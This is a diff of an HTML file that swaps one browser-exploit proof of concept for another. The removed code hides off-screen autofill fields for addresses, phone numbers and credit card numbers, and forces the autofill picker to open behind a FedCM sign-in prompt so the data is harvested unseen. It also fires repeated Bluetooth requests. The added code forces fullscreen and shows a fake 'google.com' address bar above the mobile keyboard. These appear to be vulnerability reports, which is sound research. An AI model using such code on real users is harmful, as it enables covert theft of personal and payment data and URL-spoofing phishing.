@@ -1,142 +1,104 @@
 
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<body onclick="start()" value="Click here!" type="button" />
-<p id="output">(no output yet...)</p>
-
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Show Fake URL Above Keyboard</title>
 <style>
-html { font-family: sans-serif; }
-#instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
 
-input { position: absolute; top: 0; left: -200px; opacity: 0.0001; }
-#inputElem { position: absolute; top: 30px; left: auto; left: 250px; }
-#inputElem.debug { opacity: 0.5; }
+  header {
+    padding: 16px;
+    background: #fff;
+    border-bottom: 1px solid #ddd;
+  }
 
-#output { padding: 0.2em; background: #eee; }
-#output.success { background: lightgreen; }
+  input[type="text"] {
+    width: 100%;
+    padding: 12px;
+    font-size: 16px;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    box-sizing: border-box;
+  }
+
+  main {
+    flex: 1;
+  }
+
+  .fake-bar {
+    text-align: center;
+    background: #fff7f0;
+    border-top: 1px solid #e0cbb0;
+    border-bottom: 1px solid #e0cbb0;
+    color: #222;
+    font-size: 18px;
+    padding: 8px 0;
+    position: fixed;
+    width: 100%;
+    z-index: 9999;
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity 0.3s ease, visibility 0.3s ease, bottom 0.2s ease;
+  }
+
+  .show {
+    opacity: 1;
+    visibility: visible;
+  }
 </style>
 </head>
 <body>
-<h1>PoC: Autofill obscured by FedCM prompt</h1>
-<p>Variations:</p>
-<ul>
-</ul>
 
-<!-- Group 1 -->
-<input id="groupOneElem" name="name" autocomplete="name">
-<input name="email" autocomplete="email">
-<input name="address-line1" autocomplete="address-line1">
-<input name="address-line2" autocomplete="address-line2">
-<input name="city" autocomplete="address-level2">
-<input name="state" autocomplete="address-level1">
-<input name="country-name" autocomplete="country-name">
-<input name="postal-code" autocomplete="postal-code">
-<input name="tel" autocomplete="tel">
+<header>
+  <input onclick="setTimeout(function(){myFunction()}, 1000)" placeholder="Type something..." />
+</header>
 
-<!-- Group 2 -->
-<input id="groupTwoElem" name="cc-name" autocomplete="cc-name">
-<input name="cc-number" autocomplete="cc-number">
-<input name="cc-exp-month" autocomplete="cc-exp-month">
-<input name="cc-exp-year" autocomplete="cc-exp-year">
+<main></main>
 
-<p id="instructions">Press down arrow key, then press enter</p>
+<div class="fake-bar" id="fakeBar">google.com</div>
+
 <script>
+const fakeBar = document.getElementById('fakeBar');
+let shown = false;
 
-function start(){
-
-
-navigator.bluetooth.requestDevice({acceptAllDevices:true});
-setTimeout("navigator.bluetooth.requestDevice({acceptAllDevices:true})", 20)
-}
-var searchParams = new URLSearchParams(window.location.search);
-var mode = searchParams.get('mode');
-var autofill = searchParams.get('autofill');
-var idpPort = searchParams.get('idpport');
-if (!idpPort) {
-    idpPort = 8088;
+function showFakeBar() {
+  if (!shown) {
+    fakeBar.classList.add('show');
+    shown = true;
+  }
 }
 
-var inputElem;
-var debugMode = searchParams.get('debug') === '1';
-var setMainField = () => {
-  if (autofill == 'creditcard') {
-    var groupTwoElem = document.getElementById('groupTwoElem');
-    groupTwoElem.id = 'inputElem';
-    inputElem = groupTwoElem;
+function adjustFakeBar() {
+  const vv = window.visualViewport;
+  if (vv) {
+    // Position bar just above the keyboard
+    fakeBar.style.bottom = `${window.innerHeight - vv.height}px`;
   } else {
-    var groupOneElem = document.getElementById('groupOneElem');
-    groupOneElem.id = 'inputElem';
-    inputElem = groupOneElem;
-  }
-  if (debugMode) {
-    inputElem.classList.add('debug');
+    fakeBar.style.bottom = '0';
   }
 }
 
-setMainField();
+// Show fake bar on rotation
 
-var updateOutput = () => {
-    var inputs = document.querySelectorAll('input');
-    var inputValues = [];
-    inputs.forEach((elem) => {
-       if (elem.value.length) {
-         inputValues.push(elem.value);
-       }
-    });
-    output.innerText = inputValues.join(', ');
-    output.classList.add('success');
-    instructions.innerText = 'Thank you!';
-    abortController.abort();
+// Adjust bar whenever keyboard opens/closes
+window.visualViewport?.addEventListener('resize', adjustFakeBar);
+
+function myFunction() {
+ alert();
+  document.documentElement.requestFullscreen();
+    showFakeBar();
+  adjustFakeBar();
+
+
 }
-
-inputElem.addEventListener('change', (e) => {
-  if (inputElem.value.length > 0) {
-    setTimeout(() => { updateOutput(); }, 10);
-  }
-});
-
-var ran = false;
-var abortController = new AbortController();
-
-var login = async () => {
-    var creds = await navigator.credentials.get({
-        signal: abortController.signal,
-        mediation: 'required',
-        identity: {
-            context: 'continue', // 'continue', 'signin', 'signup', 'use'
-            providers: [{
-                configURL: 'http://localhost:'+idpPort+'/config.json',
-                clientId: '123',
-                nonce: '456'
-            }]
-        }
-    });
-}
-
-if (mode == 'three') {
-    instructions.innerText = 'Press down arrow key twice, then press enter';
-} else {
-    instructions.innerText = 'Press down arrow key, then press enter';
-    setInterval(() => {
-        inputElem.focus();
-    }, 100);
-}
-
-window.addEventListener('keydown', () => {
-    if (ran) { return; }
-    ran = true;
-    if (mode == 'three') {
-	
-        setTimeout(() => {
-            // Show autofill prompt on delay to minimize time visible to user.
-            // However, autofill prompt should not be shown after FedCM prompt,
-            // otherwise autofill prompt will be above FedCM prompt.
-            inputElem.showPicker();
-        }, 140);
-    }
-    login();
-});
 </script>
+
 </body>
 </html>
